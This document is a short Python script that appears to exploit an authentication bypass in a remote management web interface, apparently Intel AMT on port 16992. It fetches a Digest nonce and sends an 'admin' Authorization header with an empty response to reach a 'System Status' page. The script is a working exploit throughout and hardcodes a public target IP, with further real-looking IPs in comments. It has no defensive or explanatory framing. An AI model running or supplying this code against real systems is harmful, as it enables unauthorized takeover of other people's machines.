# -*- coding: utf-8 -*-
import requests
#import json
def rolelogin(ip,port,pro):
    url = 'http://'+ip+':'+port+'/index.htm'
    try:
            r = requests.get(url,timeout=3)
            #print(r.headers['WWW-Authenticate'])
            list1 = []
            str1 = r.headers['WWW-Authenticate']
            list1 = str1.split('nonce=')
            list2 = list1[1].split('"')
            Authorization = '''Digest username="admin", realm="Digest:F7010000000000000000000000000000", nonce="'''+list2[1]+'''", uri="/index.htm", response="", qop=auth, nc=00000001, cnonce="495c24ec8c80274d"'''
            #print(Authorization)
            headers = {
                'Host': ip+':'+port,
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:57.0) Gecko/20100101 Firefox/57.0',
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
                'Accept-Language': 'zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2',
                'Accept-Encoding': 'gzip, deflate',
                # 'Referer': 'http://198.84.245.48:16992/logon.htm',
                'Connection': 'keep-alive',
                'Upgrade-Insecure-Requests': '1',
                'Authorization': str(Authorization)
            }
            print(headers)
            r = requests.get(url,headers = headers,)
            html = r.text
            if 'System Status' in html:
                return 1,url,''
            else:
                return 0,0,0
        
    except:
        return 0,0,0


if __name__ == '__main__':
    ip = '72.47.20.142'
    port = '16992'
    pro = 'o'
    #url = 'http://198.84.245.48:16992'
    #url = 'http://199.79.169.55:16992'
    #url = 'http://199.79.168.56:16992'
    #url = 'http://199.79.170.56:16992'
    #url = 'http://199.79.168.55:16992'
    #url = 'http://128.77.82.139:16992'  
    print rolelogin(ip,port,pro)
